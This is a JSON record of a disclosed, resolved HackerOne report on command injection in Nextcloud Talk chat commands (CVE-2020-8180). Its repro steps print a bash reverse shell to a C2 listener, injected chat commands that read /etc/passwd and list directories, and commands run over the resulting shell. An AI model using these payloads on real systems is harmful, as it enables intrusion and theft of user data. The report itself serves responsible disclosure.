@@ -1,0 +1,276 @@
+{
+  "id": 851807,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTE4MDc=",
+  "url": "https://hackerone.com/reports/851807",
+  "title": "Code injection possible with malformed Nextcloud Talk chat commands",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-16T20:44:33.101Z",
+  "submitted_at": "2020-04-16T20:44:33.101Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "covert-spectre",
+    "url": "/covert-spectre",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8180"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-06-02T14:54:13.000Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-06-02T14:52:51.598Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\nThe Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \"/command\" syntax. Users can provide additional arguments to the commands, such as \"/calc 1+1\" or \"/wiki Hello\", which are passed to the underlying script using `@exec`. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax `/wiki test $(mycommand)`. This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.\n\n## Links\n- https://nextcloud-talk.readthedocs.io/en/latest/commands/#chat-commands\n- https://github.com/nextcloud/spreed/issues/1566\n- https://github.com/nextcloud/spreed/blob/384f39ded1dceab58491555744bd5326f8ff1e3f/lib/Chat/Command/ShellExecutor.php#L103\n\n## Severity\nThis bug has been filed with a severity of `Critical` inline with the bounty impact/definition chart and the Nextcloud Threat Model as the bug allows both remote code execution via a non-admin user as well as access of complete user data of any other user. \n\n## Affected Versions\nAll versions that support Talk Commands appear to be affected as the bug is in the `@execute` command. \nThe following version were tested: \n- master-2020-04-15 via `snap install nextcloud --edge`, `occ.status versionstring: 19.0.0 beta 2`\n- 17.0.5snap1 via `snap install nextcloud`, `occ.status versionstring: 17.0.5`\n\n## Repro Steps\n1. Install and Setup Nextcloud\n   1. create Ubuntu 18.04 VM\n   2. install Nextcloud Server (Nextcloud Hub snap used for this test `snap install nextcloud --edge`)\n   3. run install command: `nextcloud.manual-install \"admin\" \"password\"`\n   4. generate self signed certificate `nextcloud.enable-https self-signed`\n   5. set trusted domains `nextcloud.occ config:system:set trusted_domains 1 --value=<domain/ip>`\n   6. create user `alice`\n   7. install and enable spreed/talk app\n   8. enable sample talk commands `nextcloud.occ talk:command:add-samples`\n   9. add calculator command as described in the [documentation here](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh)\n\n2. Setup C2 VM\n   1. kali used for this test, can be any host with netcat `nc`\n   2. run nc listener `nc -l -p 8888`\n3. Create Shell Script > shell.sh\n   > This script can be anything that gets executed and returns a shell\n   > In this case, a simple reverse shell is initiated using bash interactive piping to /dev/tcp\n   > A php web shell, meterpreter binary or any other executable could be uploaded here\n   ```\n   bash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &\n   ```\n4. Log In As Alice and Upload File\n   1. upload above shell.sh to root directory of alice's Nexcloud files\n\n5. With Alice, start a Talk Conversation\n\n6. Test Exploitability:\n    > Note, all commands appear to get successfully executed, however whether output is shown depends on the implementation of the backing script. For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh) can show the output because it has an echo command in the scrpt. \n    ```\n    /wiki test $(id)\n    /wiki test $(pwd)\n    /wiki test $(ls -al .)\n    /calc test $(cat /etc/passwd)\n    /calc test $(ls -al ../)\n    ```\n\n7. Execute Reverse Shell\n   1. Locate uploaded shell script \n      1. For nextcloud snap, the data directory is defined [here](https://github.com/nextcloud/nextcloud-snap#where-is-my-stuff)\n      2. File locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script\n      3. Can use `/calc test $(ls ../)` to explore directory structure\n   2. Enable execution of the script\n   3. Execute the script\n    ```\n    /wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n    /wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)\n    ```\n\n8. Observer C2 Listener for Connection\n\n9. Run Commands via C2\n    ```\n    id \n    pwd\n    cd /var/snap/nextcloud/common/nextcloud/data/admin/files\n    ls -al\n    occ status\n    ```\n\n## Attachments\nSee attached screenshots\n\n## Impact\n\n- Complete access to all user files\n- Shell access to occ\n- Shell access to host machine - root access if Nextcloud is running as root",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 791692,
+      "file_name": "2._alice-files.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aKHaS1qCGRA9noysaT12Ug6N?response-content-disposition=attachment%3B%20filename%3D%222._alice-files.png%22%3B%20filename%2A%3DUTF-8%27%272._alice-files.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050702Z&X-Amz-Expires=2062&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=37ab639b209fa26719f52088db5e0972f8033355a0096136521a9a4388021500",
+      "file_size": 79117,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 791693,
+      "file_name": "1._install.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Tau1uQHfNZ4wiRhDBMrTKnkC?response-content-disposition=attachment%3B%20filename%3D%221._install.png%22%3B%20filename%2A%3DUTF-8%27%271._install.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050702Z&X-Amz-Expires=2062&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0d8bb7150e3152a1b158dd793f1514a3ae29260d140e723857d0404f9643ba48",
+      "file_size": 125946,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 791694,
+      "file_name": "3._output-ls.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dAxPFj25KCymHeYHEyYQEPAV?response-content-disposition=attachment%3B%20filename%3D%223._output-ls.png%22%3B%20filename%2A%3DUTF-8%27%273._output-ls.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050702Z&X-Amz-Expires=2062&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=15ff57d2571b39a24fcde09848b13e8895ce937e123bb14ebef1eb19f9a0936c",
+      "file_size": 243431,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 791695,
+      "file_name": "4._output-passwd.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SiYueQ9iHvDr6VBv8pmxJW6Z?response-content-disposition=attachment%3B%20filename%3D%224._output-passwd.png%22%3B%20filename%2A%3DUTF-8%27%274._output-passwd.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050702Z&X-Amz-Expires=2062&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=de7f759252fbf7273b34ea741bee5e3b87a3a6bc3b4e130b9b2a822df4d58820",
+      "file_size": 284307,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 791696,
+      "file_name": "5._reverse-shell.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jEGuXoxYGFKzpbnQM2QFQBr9?response-content-disposition=attachment%3B%20filename%3D%225._reverse-shell.png%22%3B%20filename%2A%3DUTF-8%27%275._reverse-shell.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3YSDWNDF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T050702Z&X-Amz-Expires=2062&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCwwfFjioEhfY%2Bwb60ql6FArVzckS5sBGWectkgJHSiSgIhAMg5oJs2Vi45XaA3jLZ2k7owjovTAeGYKaz2ZgprJ4daKrEFCHgQAxoMMDEzNjE5Mjc0ODQ5IgyHAVH19B7%2Bs6s7jh0qjgXr86e104GIaQeBunZEASWCsjAMuh3eD3PvJBmvp6Wl3OXIxrMZfqsbpg6rYZKJOvvPIFR8zfEofSjYl%2BnUMc%2BXTIRPlXyVyfZW5mS%2FNp1SBDZaRkVsOX2XeLhwqRzLjjRHbCCBKuwAtUuL%2BQwszogk%2FPOVZA3hdoh6e9ocyMZ0ewl2In3Ntrak9886%2B3%2F6wFjlgmSoBY1uDW5cO2wcr7JtmW7xwjOAEYGxOWWZZbRF%2FvnUaY2Gz5VKwgVSw2M34R9ICi%2FRDJydMC8%2BiYEBgfoyGvMB5PKPvgamgLOdBVqF5%2F0EIKN6j86sZ8tE8Vi8EaRoOODzeNgfKq2aYLorPc40GOWAqmTsrUwaXGW3JTX%2Fj7FHNNcRyhj%2FTy1D6unM0QA6xs85oKKLkdyOwExYpDGqil8Vkh7v2jL%2FGlYcZQDiw7fhkfzqu298Nut4MI7eEEx2JnXtp528mghxkY6ZMUEP4Y77avzAUQQlrrnVNU3W6CyYrEsERtt34yiYNLQzegzZJKsRsHgkJwzbqiKUuy54wskGtVsUr7ai8mIIvg3LJF75EKFa9y%2FiXWOcOBP8KMPnooxn10GtlIsS2kWxrl20cAVtzayraGtGddpY%2FusVMi%2BU8KumcKs0p%2FVongyD3pBSHo2Z%2F2J3kwZcmUhe6eGOSQGnjCYiXzSNX98KBaEh4OvYBhBRLQz9BiHg9y34RI4BauhPKhX7TJVr%2BhTYiUljmQq83%2FnwrSnBjESbtMMQ8dFTfZdfRw%2FeNwm%2BRmQD5wYLdZZwbY5zPwEANR7ZuaTvjpGH5RYjtAG0r3812YgsbXXpcGTIZFYnINVIc1s%2BLayjc%2Fzpn%2BM%2F5meBJ6pLcHpf5v54n4j0CHHvQvz%2FWyYwlZO20gY6sAEN5%2BUNgMxXD3xAi%2FsU2DhmXnzCQ86ZQxAEYi705Du4MZp7rAtO161kywB3XDYzDAR5D4cMOtVsGBRcjBar3zL942v9D8VKuViyRyDKcHm4gScnVXJjLMOduwMYhkrO77paEUp%2FPqPuv6T42C0l4nq6vDI8Hcj6w%2FmwGHPF4hKyZJH3RM4Emb5dFBp%2BskpszRvw4zYDyv9Jar6qYlwhlt0TDAWXvjyeOu1TfvTKWEeZqg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ffbe9745562d40e8313432d143c28a91c034db216ffe65c2eea3698eb1ebb2c9",
+      "file_size": 148294,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-07-02T14:52:51.681Z",
+  "allow_singular_disclosure_after": -189785650.6091547,
+  "singular_disclosure_allowed": true,
+  "vote_count": 317,
+  "voters": [
+    "wi11",
+    "r4d1kal",
+    "trojan187",
+    "fabianfreyer",
+    "0xdsm",
+    "orange303",
+    "a_d_a_m",
+    "dexter0us",
+    "nikitastupin",
+    "ali",
+    "and 307 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 14804,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/spreed",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 21311,
+      "category": "researcher",
+      "content": "The Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the \"/command\" syntax. Users can provide additional arguments to the commands, such as \"/calc 1+1\" or \"/wiki Hello\", which are passed to the underlying script using @exec. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax /wiki test $(mycommand). This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.",
+      "updated_at": "2020-04-16T20:48:24.939Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1049956,
+        "username": "covert-spectre",
+        "name": "Spectre",
+        "bio": null,
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": null,
+        "created_at": "2020-04-16T20:28:54.552Z",
+        "url": "https://hackerone.com/covert-spectre",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    }
+  ],
+  "databaseId": "851807",
+  "votes": 317,
+  "latest_disclosable_activity_at": "2020-06-02T14:54:12.942Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:07:02.416187",
+    "source": "https://hackerone.com/reports/851807.json",
+    "report_id": 851807
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTE4MDc=",
+    "databaseId": "851807",
+    "title": "Code injection possible with malformed Nextcloud Talk chat commands",
+    "url": "https://hackerone.com/reports/851807",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-06-02T14:54:13.000Z",
+    "created_at": "2020-04-16T20:44:33.101Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzcw",
+      "name": "Code Injection",
+      "external_id": "cwe-94"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 8.0
+    },
+    "reporter": {
+      "username": "covert-spectre"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8yMTQ2Nzk=",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2020-04-30T20:18:22.478Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzg1MTgwNw==",
+    "_id": "851807",
+    "disclosed": true,
+    "votes": 317,
+    "latest_disclosable_activity_at": "2020-06-02T14:54:12.942Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTE4MDc=",
+      "databaseId": "851807",
+      "title": "Code injection possible with malformed Nextcloud Talk chat commands",
+      "url": "https://hackerone.com/reports/851807",
+      "disclosed_at": "2020-06-02T14:54:13.000Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    }
+  }
+}
